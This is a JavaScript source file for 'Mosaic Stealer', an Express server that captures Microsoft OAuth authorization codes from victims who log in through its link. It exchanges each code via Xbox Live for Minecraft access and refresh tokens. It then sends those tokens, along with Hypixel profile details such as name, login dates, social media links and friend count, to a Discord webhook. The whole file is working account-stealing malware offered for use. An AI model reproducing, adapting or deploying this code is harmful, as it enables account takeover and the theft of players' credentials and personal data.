//import mods
const ax = require("axios");
var querystring = require("querystring");
const { Webhook, MessageBuilder } = require("discord-webhook-node");
var express = require("express");
var fs = require("fs");
const app = express();

var settings = JSON.parse(fs.readFileSync("settings.json"));

const port = settings["port"];

function replaceAll(str, find, replace) {
  return str.replace(new RegExp(find, "g"), replace);
}
function timeConverter(t) {
  return new Date(t).toLocaleDateString("en-US");
}
console.log(`
\u001b[0;31m███▄ ▄███▓ ▒█████    ██████  ▄▄▄       ██▓ ▄████▄  
▓██▒▀█▀ ██▒▒██▒  ██▒▒██    ▒ ▒████▄    ▓██▒▒██▀ ▀█  
▓██    ▓██░▒██░  ██▒░ ▓██▄   ▒██  ▀█▄  ▒██▒▒▓█    ▄ 
▒██    ▒██ ▒██   ██░  ▒   ██▒░██▄▄▄▄██ ░██░▒▓▓▄ ▄██▒
▒██▒   ░██▒░ ████▓▒░▒██████▒▒ ▓█   ▓██▒░██░▒ ▓███▀ ░
░ ▒░   ░  ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░░▓  ░ ░▒ ▒  ░
░  ░      ░  ░ ▒ ▒░ ░ ░▒  ░ ░  ▒   ▒▒ ░ ▒ ░  ░  ▒   
░      ░   ░ ░ ░ ▒  ░  ░  ░    ░   ▒    ▒ ░░        
       ░       ░ ░        ░        ░  ░ ░  ░ ░      
                                           ░        
`);
console.log(
  `URL: https://login.live.com/oauth20_authorize.srf?client_id=${encodeURIComponent(
    settings["client_id"]
  )}&response_type=code&redirect_uri=${encodeURIComponent(
    settings["redirect_uri"]
  )}&scope=XboxLive.signin%20offline_access`
);
function getJavaAccess(code) {
  const javaPromise = new Promise((resolve, reject) => {
    ax.post(
      `https://login.microsoftonline.com/consumers/oauth2/v2.0/token`,
      querystring.stringify({
        client_id: `${settings["client_id"]}`,
        scope: "XboxLive.signin offline_access",
        code: `${code}`,
        redirect_uri: `${settings["redirect_uri"]}`,
        grant_type: "authorization_code",
        client_secret: `${settings["client_secret"]}`,
      }),
      { headers: { "Content-Type": "application/x-www-form-urlencoded" } }
    ).then((resp) => {
      const refreshtoken = resp.data["refresh_token"];
      var fdf = {
        Properties: {
          AuthMethod: "RPS",
          SiteName: "user.auth.xboxlive.com",
          RpsTicket: "d=" + resp.data["access_token"],
        },
        RelyingParty: "http://auth.xboxlive.com",
        TokenType: "JWT",
      };
      ax.post("https://user.auth.xboxlive.com/user/authenticate", fdf)
        .then((resp) => {
          var xbxreq = {
            Properties: {
              SandboxId: "RETAIL",
              UserTokens: ["" + resp.data["Token"]],
            },
            RelyingParty: "rp://api.minecraftservices.com/",
            TokenType: "JWT",
          };
          ax.post("https://xsts.auth.xboxlive.com/xsts/authorize", xbxreq)
            .then((resp2) => {
              const uhs = JSON.stringify(
                resp2.data["DisplayClaims"]["xui"][0]["uhs"]
              );
              var lastAuth = {
                identityToken: `XBL3.0 x=${replaceAll(
                  uhs,
                  '"',
                  ""
                )};${replaceAll(JSON.stringify(resp2.data["Token"]), '"', "")}`,
              };
              ax.post(
                "https://api.minecraftservices.com/authentication/login_with_xbox",
                lastAuth
              )
                .then((responz) => {
                  resolve({
                    access: responz.data["access_token"],
                    refresh: refreshtoken,
                  });
                  return;
                })
                .catch((err) => reject(err));
            })
            .catch((err) => reject(err));
        })
        .catch((err) => reject(err));
    });
  });
  return javaPromise;
}

var apiKey = settings["HypixelApiKey"]; // HYPIXEL API KEY
app.get("/", (req, res) => {
  if (!req.query.code) return res.status(404).end("404");
  getJavaAccess(req.query.code)
    .then((data) => {
      const token = data["access"];
      const refresh = data["refresh"];
      ax.get("https://api.minecraftservices.com/minecraft/profile", {
        headers: { Authorization: "Bearer " + token },
      }).then((resp) => {
        var ply = resp.data["id"];
        if (apiKey == "" || !apiKey) {
          const hook = new Webhook(settings["webhook"]);
          const embed = new MessageBuilder()
            .setTitle("New player has been logged.")
            .setAuthor("Mosaic Stealer")
            .setColor("#FF0000")
            .setDescription(
              "**Access token:** ```" +
                token +
                "```\n**Refresh token:** ```" +
                refresh +
                "```"
            );
          hook
            .send(embed)
            .then((res) =>
              console.log(
                "\u001b[0;32mSent information to webhook.\u001b[0;37m"
              )
            )
            .catch((err) => {
              console.log(
                `\u001b[0;31mError has occured sending everything to the webhook: \u001b[1;32m${err}\u001b[0;37m`
              );
            });
          return;
        }
        ax.get("https://api.hypixel.net/friends?uuid=" + ply, {
          headers: {
            "API-Key": apiKey,
            "Content-Type": "application/json",
            "Accept-Encoding": "*",
          },
        }).then((resp) => {
          //check how many friends the player has.
          var friends = 0;
          for (const friend in resp.data["records"]) {
            friends++;
          }
          ax.get("https://api.hypixel.net/player?uuid=" + ply, {
            headers: {
              "API-Key": apiKey,
              "Content-Type": "application/json",
              "Accept-Encoding": "*",
            },
          }).then((resp) => {
            const hook = new Webhook(settings["webhook"]);
            const embed = new MessageBuilder()
              .setTitle("New player has been logged.")
              .setAuthor("Mosaic Stealer")
              .setColor("#FF0000")
              .setDescription(
                "**Access token:** ```" +
                  token +
                  "```\n**Refresh token:** ```" +
                  refresh +
                  "```"
              );
            embed.addField(
              "Player name: ",
              resp.data["player"]["displayname"],
              true
            );
            embed.addField(
              "First Login Date: ",
              timeConverter(resp.data["player"]["firstLogin"]),
              true
            );
            embed.addField(
              "Last login date: ",
              timeConverter(resp.data["player"]["lastLogin"]),
              true
            );
            if (resp.data["player"]["socialMedia"] != undefined) {
              for (const lol in resp.data["player"]["socialMedia"]["links"]) {
                embed.addField(
                  lol,
                  resp.data["player"]["socialMedia"]["links"][lol],
                  true
                );
              }
            }
            embed.addField(
              "\nAchievement Points: ",
              resp.data["player"]["achievementPoints"],
              true
            );
            embed.addField("Karma: ", resp.data["player"]["karma"], true);
            embed.addField("Friends: ", friends, true);
            hook
              .send(embed)
              .then((res) =>
                console.log(
                  "\u001b[0;32mSent information to webhook.\u001b[0;37m"
                )
              )
              .catch((err) => {
                console.log(
                  `\u001b[0;31mError has occured sending everything to the webhook: \u001b[1;32m${err}\u001b[0;37m`
                );
              });
          });
        });
      });
      res.end();
    })
    .catch((err) => {
      console.log(
        `\u001b[0;31mError while grabbing token:\u001b[1;32m ${req.query.code}\u001b[0;37m`
      );
    });
});

app.listen(port, () => {
  console.log(
    `\u001b[1;31mMosaicStealer\u001b[0;31m is listening on port: \u001b[1;32m${port}\u001b[0;37m`
  );
});
